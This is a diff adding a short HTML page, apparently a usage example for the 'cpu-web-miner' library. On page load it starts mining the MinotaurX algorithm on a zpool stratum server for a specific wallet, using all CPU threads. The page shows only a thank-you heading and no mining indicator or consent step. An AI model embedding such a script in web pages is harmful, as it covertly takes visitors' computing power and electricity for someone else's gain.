@@ -1,0 +1,29 @@
+<!DOCTYPE html>
+<html>
+<body>
+
+<h2>Thanks for using cpu-web-miner</h2>
+
+<script type="module">
+import * as cpuWebMiner from 'https://esm.run/@marco_ciaramella/cpu-web-miner';
+
+const stratum = {
+    server: "minotaurx.na.mine.zpool.ca",
+    port: 7019,
+    worker: "D8Se38x8nR1QusEZFqyuXJZpdH3b38yuNm",
+    password: "c=DGB",
+    ssl: false // true when pool uses SSL, false otherwise
+}
+
+cpuWebMiner.start(
+    cpuWebMiner.minotaurx,
+    stratum,
+    null,
+    cpuWebMiner.ALL_THREADS,
+    work => console.log(work),
+    hashrate => console.log(hashrate),
+    error => console.log(error));
+</script> 
+
+</body>
+</html>
